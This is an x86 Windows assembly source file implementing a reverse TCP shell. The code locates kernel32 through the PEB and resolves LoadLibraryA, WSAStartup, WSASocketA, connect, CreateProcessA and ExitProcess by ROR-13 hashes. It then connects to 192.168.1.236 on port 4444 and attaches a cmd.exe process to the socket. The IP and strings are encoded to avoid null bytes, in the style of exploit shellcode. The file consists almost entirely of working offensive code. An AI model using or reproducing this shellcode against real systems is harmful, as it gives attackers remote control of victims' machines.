global _start

section .text
_start:

 ;lea ebp, [findSymbolByHash]
 ;lea edi, [hashString]
 mov ebp, findSymbolByHash
 mov edi, hashString

getKernel32Base:
    xor ecx, ecx                ; zeroing register ECX
    mul ecx                     ; zeroing register EAX EDX
    mov eax, [fs:ecx + 0x030]   ; PEB loaded in eax
    mov eax, [eax + 0x00c]      ; LDR loaded in eax
    mov esi, [eax + 0x014]      ; InMemoryOrderModuleList loaded in esi
    lodsd                       ; program.exe address loaded in eax (1st module)
    xchg esi, eax               
    lodsd                       ; ntdll.dll address loaded (2nd module)
    mov ebx, [eax + 0x10]       ; kernel32.dll address loaded in ebx (3rd module)
    mov eax, ebx
    ; EBX = base of kernel32.dll address

    ; EAX 76140000 kernel32.76140000
    ; ECX 00000000
    ; EDX 00000000
    ; EBX 76140000 kernel32.76140000
    ; ESP 0022FF8C
    ; EBP 0022FF94
    ; ESI 0054190C
    ; EDI 00000000
    ; EIP 00401005 reverse_.00401005

    push 0xec0e4e8e          ; LoadLibraryA hash
    push eax
    call ebp                 ; call findSymbolByHash
 
    ; EAX 76192864 kernel32.LoadLibraryA
    ; ECX 00000000
    ; EDX 00000000
    ; EBX 76140000 kernel32.76140000
    ; ESP 0022FF8C
    ; EBP 0022FF94
    ; ESI 0054190C
    ; EDI 00000000
    ; EIP 00401010 reverse_.00401010

    
getws2_32:
    push 0x61613233                 ; 23
    sub word [esp + 0x2], 0x6161    ; sub aa from aa23_2sw
    push 0x5f327377                 ; _2sw
    push esp                        ; pointer to the string
    call eax                        ; call Loadlibrary and find ws2_32.dll
    mov edx, eax                    ; save winsock handle for future puproses

    ; EAX 75FE0000 OFFSET ws2_32.#332
    ; ECX 77BE316F ntdll.77BE316F
    ; EDX 75FE0000 OFFSET ws2_32.#332
    ; EBX 760C0000 kernel32.760C0000
    ; ESP 0022FF84 ASCII "ws2_32"
    ; EBP 004010F7 reverse_.004010F7
    ; ESI 0054190C
    ; EDI 00401140 reverse_.00401140
    ; EIP 00401040 reverse_.00401040

getWSAStartup:
    push 0x3bfcedcb                 ; WSAStartup hash
    push edx                        ; push ws2_32.dll handler
    call ebp                        ; find WSAStartup in ws2_32.dll handler
    add sp, 8
    push eax
    lea esi, [esp]
    mov [esi+0x4], eax

getWSASocketA:
    push 0xadf509d9                 ; WSASocketA hash
    push edx                        ; push ws2_32.dll handler
    call ebp                        ; find WSASocketA in ws2_32.dll handler
    add sp, 8
    mov [esi+0x8], eax

getConnect:
    push 0x60aaf9ec                 ; connect hash
    push edx                        ; push ws2_32.dll handler
    call ebp                        ; find connect in ws2_32.dll handler
    add sp, 8
    mov [esi+0xc], eax

getCreateProcessA:
    push 0x16b3fe72                 ; CreateProcessA hash
    push ebx                        ; push kernel32.dll handler
    call ebp                        ; find CreateProcessA in kernel32.dll handler
    add sp, 8
    mov [esi+0x10], eax

getExitProcess:
    push 0x73e2d87e          ; ExitProcess hash
    push ebx                 ; kernel32 dll location
    call ebp    
    add sp, 8
    mov [esi+0x14], eax         
    
callWSAStartUp:
    xor edx, edx
    mov dx, 0x190          ; EAX = sizeof( struct WSAData )
    sub esp, edx           ; alloc some space for the WSAData structure
    push esp               ; push a pointer to this stuct
    push edx               ; push the wVersionRequested parameter
    call dword [esi+0x4]   ; call WSAStartup(MAKEWORD(2, 2), wsadata_pointer)

callWSASocketA:
    xor edx, edx                    ; clear edx
    push edx;                       ; dwFlags=NULL
    push edx;                       ; g=NULL
    push edx;                       ; lpProtocolInfo=NULL
    mov dl, 0x6                     ; protocol=6
    push edx
    sub dl, 0x5                     ; edx==1
    push edx                        ; type=1
    inc edx                         ; af=2
    push edx
    call dword [esi+0x8]            ; call WSASocketA
    push eax                        ; save eax in edi
    pop edi                         ; 

callConnect:
    ;set up sockaddr_in
    mov edx, 0xed02a9c1             ;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.1.236)
    sub edx, 0x01010101             ;subtract from edx to obtain the real IP
    push edx                        ;push sin_addr
    push word 0x5c11                ;0x115c = (port 4444)
    xor edx, edx
    mov dl, 2
    push dx 
    mov edx, esp
    push byte 0x10
    push edx
    push edi
    call dword [esi+0xc] 

shell:
    push 0x61646d63                 ; push admc
    sub word [esp + 0x3], 0x61      ; sub a to admc = dmc
    mov ebp, esp                    ; save a pointer to the command line
    push edi                        ; our socket becomes the shells hStdError
    push edi                        ; our socket becomes the shells hStdOutput
    push edi                        ; our socket becomes the shells hStdInput
    xor edi, edi                    ; Clear edi for all the NULL's we need to push
    push byte 0x12                  ; We want to place (18 * 4) = 72 null bytes onto the stack
    pop ecx                         ; Set ECX for the loop

push_loop:
    push edi                        ; push a null dword
    loop push_loop                  ; keep looping untill we have pushed enough nulls
    mov word [esp + 0x3C], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
    mov byte [esp + 0x10], 0x44
    lea ecx, [esp + 0x10]  ; Set EAX as a pointer to our STARTUPINFO Structure

    ;perform the call to CreateProcessA
    push esp               ; Push the pointer to the PROCESS_INFORMATION Structure 
    push ecx               ; Push the pointer to the STARTUPINFO Structure
    push edi               ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
    push edi               ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
    push edi               ; We dont specify any dwCreationFlags 
    inc edi                ; Increment edi to be one
    push edi               ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent
    dec edi                ; Decrement edi back down to zero
    push edi               ; Set lpThreadAttributes to NULL
    push edi               ; Set lpProcessAttributes to NULL
    push ebp               ; Set the lpCommandLine to point to "cmd",0
    push edi               ; Set lpApplicationName to NULL as we are using the command line param instead
    call dword [esi+0x10]

callExitProcess:
    xor  edx, edx
    push edx                ; uExitCode
    call dword [esi+0x14]   ; call ExitProcess(0)

;----------------------------------------------------------;
; Functions called                                         ;
;----------------------------------------------------------;


findSymbolByHash:
    pushad
    mov ebp, [esp + 0x24]       ; load 1st arg: dllBase
    mov eax, [ebp + 0x3c]       ; get offset to PE signature
    ; load edx w/ DataDirectories array: assumes PE32
    mov edx, [ebp + eax + 4+20+96]
    add edx, ebp                ; edx:= addr IMAGE_EXPORT_DIRECTORY
    mov ecx, [edx + 0x18]       ; ecx:= NumberOfNames
    mov ebx, [edx + 0x20]       ; ebx:= RVA of AddressOfNames
    add ebx, ebp                ; rva->va
search_loop:
    dec ecx                     ; dec loop counter

    ; esi:= next name, uses ecx*4 because each pointer is 4 bytes
    mov esi, [ebx+ecx*4]
    add esi, ebp                ; rva->va
    push esi
    call edi              ; hash the current string
    add sp, 4

    ; check hash result against arg #2 on stack: symHash
    cmp eax, [esp + 0x28]
    jnz search_loop

    ; at this point we found the string in AddressOfNames
    mov ebx, [edx+0x24]         ; ebx:= ordinal table rva
    add ebx, ebp                ; rva->va

    ; turn cx into ordinal from name index.
    ; use ecx*2: each value is 2 bytes

    mov cx, [ebx+ecx*2]
    mov ebx, [edx+0x1c]         ; ebx:= RVA of AddressOfFunctions
    add ebx, ebp                ; rva->va

    ; eax:= Export function rva. Use ecx*4: each value is 4 bytes
    mov eax, [ebx+ecx*4]
    add eax, ebp                ; rva->va
done:
    mov [esp + 0x1c], eax       ; overwrite eax saved on stack
    popad
    ret


hashString:
    push esi
    push edi
    mov esi, dword [esp+0x0c]   ; load function argument in esi
calc_hash:
    xor edi, edi
    cld
hash_iter:
    xor eax, eax
    lodsb                       ; load next byte of input string
    cmp al, ah
    je  hash_done               ; check if at end of symbol
    ror edi, 0x0d               ; rotate right 13 (0x0d)
    add edi, eax
    jmp hash_iter
hash_done:
    mov eax, edi
    pop edi
    pop esi
    ret